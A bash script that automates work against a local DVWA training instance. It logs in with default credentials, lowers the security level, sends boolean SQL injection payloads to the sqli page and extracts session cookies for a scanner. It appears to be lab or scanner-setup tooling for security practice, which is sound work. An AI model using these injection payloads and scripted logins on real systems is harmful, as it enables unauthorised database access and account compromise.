#!/bin/bash
DVWA_URL="http://127.0.0.1"
COOKIE_FILE="cookies.txt"

# Clean start
rm -f "$COOKIE_FILE"

# 1. Get initial session
echo "Getting session..."
curl -s -c "$COOKIE_FILE" "$DVWA_URL/login.php" > /dev/null

# 2. Get CSRF token
echo "Getting token..."
TOKEN=$(curl -s -b "$COOKIE_FILE" "$DVWA_URL/login.php" | grep -oP "user_token.*?value='\K[^']+")
echo "Token: $TOKEN"

# 3. Login
echo "Logging in..."
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  "$DVWA_URL/login.php" > /dev/null

# 4. Set security to low
echo "Setting security to low..."
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
  -d "security=low&seclev_submit=Submit" \
  "$DVWA_URL/security.php" > /dev/null

# 5. Test the vulnerable endpoint
echo -e "\nTesting vulnerability:"
echo "Normal (id=1):"
curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "Surname" | wc -l

echo "TRUE payload (should show 5 users):"
curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" | grep -o "Surname" | wc -l

echo "FALSE payload (should show 0 users):"
curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1'+OR+'1'%3D'2&Submit=Submit" | grep -o "Surname" | wc -l

# 6. Extract cookies for scanner
echo -e "\n====================================="
PHPSESSID=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $7}')
SECURITY=$(grep -E "security\s" "$COOKIE_FILE" | awk '{print $7}')
echo "Cookie string:"
echo "PHPSESSID=$PHPSESSID; security=$SECURITY"
echo "====================================="
